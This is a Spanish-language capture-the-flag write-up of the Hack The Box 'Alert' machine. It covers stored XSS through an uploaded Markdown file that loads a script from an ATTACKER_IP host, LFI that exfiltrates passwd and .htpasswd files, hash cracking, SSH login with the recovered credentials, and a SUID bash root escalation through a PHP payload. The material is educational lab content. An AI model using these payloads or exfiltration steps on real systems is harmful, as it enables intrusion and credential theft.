# Alert - Hack The Box

![Dificultad](https://img.shields.io/badge/Dificultad-Easy-green)
![SO](https://img.shields.io/badge/SO-Linux-blue)
![Técnicas](https://img.shields.io/badge/Técnicas-XSS%20%7C%20LFI%20%7C%20SUID-red)

---

## Información de la máquina

- **Nombre:** Alert
- **Plataforma:** Hack The Box
- **IP:** 10.10.11.44
- **SO:** Linux (Ubuntu)
- **Dificultad:** Easy
- **Link HTB:** [Alert machine](https://app.hackthebox.com/machines/Alert)

---

## Resumen ejecutivo

La explotación de Alert se desarrolla en **tres fases principales**:

1. **XSS Stored** → Subida de archivo Markdown malicioso con JavaScript embebido para ejecutar código en el navegador del administrador
2. **LFI via XSS** → Exfiltración de archivos sensibles del servidor mediante Local File Inclusion aprovechando la sesión privilegiada del administrador
3. **SUID Abuse** → Escalada de privilegios modificando permisos de `/bin/bash` mediante escritura en directorio con servicio web ejecutándose como root

---

## 📂 Contenido del directorio
```
Alert/
├── README.md                    # Este archivo
├── Alert.md                     # Guía completa paso a paso
├── Script/
│   ├── pwned.js                # Script XSS para exfiltración
└── Imágenes/
    └── web_*.png               # Capturas del proceso de explotación
```

---

## Técnicas y vulnerabilidades explotadas

### 1. **Stored XSS (Cross-Site Scripting)**
- **Vector de ataque:** Upload de archivos Markdown sin sanitización
- **Ubicación:** `visualizer.php` - Sistema de visualización de Markdown
- **Payload inicial:** 
```html
  <script src="http://ATTACKER_IP/pwned.js"></script>
```
- **Impacto:** Ejecución de JavaScript arbitrario en contexto del administrador

### 2. **Local File Inclusion (LFI)**
- **Método:** XSS chaining para realizar LFI desde sesión privilegiada
- **Endpoint vulnerable:** `messages.php?file=`
- **Path traversal:** `../../../../../etc/passwd`
- **Archivos exfiltrados:**
  - `/etc/passwd` (enumeración de usuarios)
  - `/etc/apache2/sites-available/000-default.conf` (configuración Apache)
  - `/var/www/statistics.alert.htb/.htpasswd` (credenciales hasheadas)

### 3. **Password Cracking**
- **Hash encontrado:** `$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/` (Apache MD5)
- **Herramienta:** Hashcat
- **Credenciales obtenidas:** `albert:manchesterunited`

### 4. **SSH Access**
- **Usuario:** albert
- **Contraseña:** manchesterunited
- **Acceso logrado:** Shell interactiva como usuario `albert`

### 5. **Privilege Escalation via SUID**
- **Servicio vulnerable:** Web server interno (puerto 8080) ejecutándose como root
- **Capacidad de escritura:** Directorio `/opt/website-monitor/monitors/`
- **Técnica:** Creación de archivo PHP que modifica permisos SUID de `/bin/bash`
- **Payload:**
  
```php
  <?php system("chmod u+s /bin/bash"); ?>
```

- **Shell root:** `bash -p`

---

## Flujo de explotación:**

1. **Crear archivo Markdown malicioso:**
   
```bash
   echo '<script src="http://ATTACKER_IP/pwned.js"></script>' > malicious.md
```

2. **Iniciar servidor HTTP:**
```bash
   python3 -m http.server 80
```

3. **Subir archivo `.md` en la aplicación web**

4. **Obtener link del archivo subido**

5. **Enviar link al administrador vía formulario "Contact Us"**

6. **Recibir datos exfiltrados en base64:**

```bash
   # Decodificar respuesta
   echo "BASE64_STRING" | base64 -d
```

---

##  Recursos y herramientas utilizadas

### Herramientas principales
- **Nmap** - Escaneo de puertos y servicios
- **Gobuster** - Enumeración de directorios
- **Hashcat** - Cracking de contraseñas
- **BurpSuite** - Análisis de tráfico HTTP
- **Python HTTP Server** - Recepción de datos exfiltrados
- **SSH** - Acceso remoto y port forwarding

### Comandos clave

**Escaneo inicial:**
```bash
nmap -p- --open -sS -n -Pn --min-rate 5000 10.10.11.44 -oG allPorts
nmap -p22,80 -sCV 10.10.11.44 -oN targeted
```

**Fuzzing de subdominios:**
```bash
wfuzz -c -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  --hc 404 -H "Host: FUZZ.alert.htb" http://alert.htb
```

**Cracking de hash Apache MD5:**
```bash
hashcat -m 1600 credential /usr/share/wordlists/rockyou.txt --user
```

**Buscar archivos por grupo:**
```bash
find / -group management 2>/dev/null
```

**Listar puertos internos:**
```bash
ss -nltp
```

**Port forwarding SSH:**
```bash
ssh albert@10.10.11.44 -L 8080:127.0.0.1:8080
```

---

## Conceptos aprendidos

### Seguridad Web
- **XSS Stored mediante archivo upload** - Bypass de validación de tipo MIME
- **XSS Chaining** - Uso de XSS para realizar ataques secundarios (LFI)
- **Data exfiltration** - Técnicas de envío de información sensible a servidor externo
- **Base64 encoding** - Ofuscación de datos exfiltrados en URL

### Local File Inclusion (LFI)
- **Path traversal** - Navegación por sistema de archivos con `../`
- **Objetivos comunes:**
  - `/etc/passwd` - Enumeración de usuarios
  - Archivos de configuración de servicios
  - Archivos `.htpasswd` - Credenciales de autenticación HTTP

### Escalada de privilegios
- **Port forwarding SSH** - Acceso a servicios internos desde máquina atacante
- **SUID abuse** - Modificación de permisos de binarios para ejecutar como root
- **Group-based access** - Explotación de pertenencia a grupos con permisos especiales
- **Web service exploitation** - Escritura en directorios servidos por procesos privilegiados

### Password Cracking
- **Identificación de hashes** - Reconocimiento de formato Apache MD5 (`$apr1$`)
- **Hashcat modes** - Uso de `-m 1600` para Apache MD5
- **Wordlist attacks** - Uso de rockyou.txt

---

## Notas importantes

1. **Timing del administrador:** El bot administrador visita los links enviados cada ~30 segundos. Si no recibes respuesta, reenvía el mensaje.

2. **Base64 decoding:** Al recibir la exfiltración, asegúrate de decodificar correctamente:
3. 
```bash
   echo -n "STRING_BASE64" | base64 -d
```

3. **Port forwarding persistente:** Mantén la sesión SSH activa durante la explotación del servicio interno (puerto 8080).

4. **Path del script PHP:** El archivo debe estar exactamente en `/opt/website-monitor/monitors/` para ser accesible vía web.

5. **Bash SUID:** Después de modificar permisos, usa `bash -p` (no solo `bash`) para mantener privilegios.

---

## 🔗 Referencias y documentación relacionada

- [XSS (Cross-Site Scripting)](../../../../OWASP%20TOP%2010/XSS/)
- [LFI (Local File Inclusion)](../../../../OWASP%20TOP%2010/LFI/)
- [Escalada de privilegios Linux](../../../../Técnicas/Escalada%20de%20privilegios/)
- [Hashcat - Password Cracking](../../../../Herramientas/Hashcat/)
- [SSH Port Forwarding](../../../../Técnicas/Port%20Forwarding/)

---

## Diagrama de ataque
```
┌─────────────────────┐
│  1. Upload .md XSS  │
│  <script src=...>   │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│  2. Admin clicks    │
│  Executes pwned.js  │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│  3. LFI via XSS     │
│  Exfil .htpasswd    │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│  4. Crack hash      │
│  albert:manchester  │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│  5. SSH Access      │
│  User: albert       │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│  6. Port Forward    │
│  Access port 8080   │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│  7. Upload PHP      │
│  chmod u+s bash     │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│  8. bash -p         │
│  ROOT ACCESS ✓      │
└─────────────────────┘
```

---

## Créditos

- **Máquina creada por:** Hack The Box
- **Writeup y scripts:** Documentación educativa con fines de aprendizaje
- **Inspiración:** Comunidad de s4vitar y Hack The Box

---

## Disclaimer legal

Este material tiene **fines exclusivamente educativos**. La explotación de sistemas sin autorización expresa es **ilegal**. Practica únicamente en:
- Laboratorios autorizados (HTB, VulnHub, PentesterLab)
- Máquinas virtuales propias
- Entornos de testing con permiso escrito

**No nos hacemos responsables del uso indebido de esta información.**
